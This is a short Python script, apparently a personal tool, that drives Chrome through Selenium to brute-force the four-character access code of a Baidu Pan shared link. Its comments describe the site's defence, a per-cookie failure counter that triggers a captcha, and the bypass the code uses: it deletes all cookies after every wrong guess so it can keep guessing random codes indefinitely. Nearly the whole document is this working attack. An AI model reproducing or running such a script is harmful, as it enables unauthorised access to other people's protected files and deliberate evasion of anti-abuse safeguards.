#! /usr/bin/python3
#! coding:          utf-8
#! Date:            2019-11-28
#! Author:          Rea$on
#! Version:         Beta 0.1
#! Requirements:    Python3, Selenium, chromedriver

'''
目标防御机制:
    Js验证, 记录同一Cookie的请求失败次数, 达到一定次数后生成验证码
破解方法:
    每一次请求失败都重置Cookie
待办事项:
    Git, 多线程, 字典增效, 参数解析
    
ChromeDriver:
    https://sites.google.com/a/chromium.org/chromedriver/downloads
'''

import sys
import string, random
import time, datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options


url    = "https://pan.baidu.com/s/1Vi2g_l0A4UJFnuAaeZh7fg"
passwd = 'os0p' # TEST
prompt = string.ascii_lowercase + string.digits
TEST   = False

def code():
    return ''.join([prompt[random.randint(0,35)] for i in range(4)])

def main():

    count = 0
    # ----- PREPARE -----
    chrome_opt = Options()
    chrome_opt.add_argument('--headless')
    # Choose START
    b = webdriver.Chrome()                              # Normal   Mode
    # b = webdriver.Chrome(chrome_options=chrome_opt)   # Headless Mode 
    # Choose END
    
    # ----- START -----
    start = datetime.datetime.now()
    print(f"[START] {start.strftime('%Y-%m-%d %H:%M:%S')}")
    
    b.get(url)

    # ----- WHILE LOOP -----
    while True:
        try:
            count += 1
            input = b.find_element_by_id('mwxxPOD')
            if not TEST:
                c = code()
            else:
                c = code() if count <= 50 else passwd
            input.send_keys(c)
            b.find_element_by_class_name('g-button').click()
            input.clear()
            b.delete_all_cookies()
        except KeyboardInterrupt:
            print("[FAIL] KeyboardInterrupt")
            break
        except Exception as e:
            print(f"[CODE]: {c}")
            break
        if count % 1000 == 0:
            print(f"[TRIED] {count} times")

    end = datetime.datetime.now()
    
    # ----- OUTPUT ----- 
    print(f"[END]   {end.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[COST]  {(end-start).seconds} seconds")
    print(f"[TRIED] {count} times")
        
    
    # ----- END -----
    # b.close()
    
if __name__ == '__main__':
    main()






















